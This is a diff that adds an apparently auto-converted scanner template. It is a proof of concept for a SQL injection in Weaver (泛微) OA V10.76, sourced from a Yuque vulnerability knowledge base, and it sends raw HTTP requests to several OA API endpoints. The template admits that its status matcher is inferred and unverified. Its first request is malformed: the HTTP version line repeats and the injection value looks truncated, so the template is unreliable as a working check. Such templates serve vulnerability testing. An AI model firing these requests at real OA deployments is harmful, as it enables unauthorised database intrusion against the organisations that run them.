@@ -1,0 +1,36 @@
+id: poc-vz1l434hfrbkm76o
+info:
+  name: 泛微OA-V10.76补丁分析-seccategorySQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vz1l434hfrbkm76o
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vz1l434hfrbkm76o
+http:
+- raw:
+  - 'GET /api/doc/out/more/list?elementmore={"newsCatalogIds"%3a["1"],"srcType"%3a"2","perpage"%3a"1","srcContent"%3a" HTTP/1.1
+
+    99999"} HTTP/1.1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - GET /api/ec/dev/table/getxml?dataKey=628a12ff-5528-46d7-9092-0deee8460e88_3B78D7B6E027F6615DA80BE763F33661 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - POST  /api/ec/mobile/table/counts  HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
